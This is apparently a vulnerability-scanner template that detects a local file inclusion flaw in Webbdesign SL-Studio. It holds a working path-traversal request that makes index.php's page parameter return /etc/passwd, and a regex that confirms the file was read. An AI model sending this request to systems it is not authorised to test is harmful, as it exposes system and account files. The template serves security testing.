id: sl-studio-lfi
name: Webbdesign SL-Studio - Local File Inclusion
severity: high
confidence: tentative
description: Webbdesign SL-Studio is vulnerable to local file inclusion.
reference: CWE-22
tags:
- slstudio
- lfi
- vuln
requests:
- method: GET
  path: /index.php?page=../../../../../../../../../../etc/passwd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
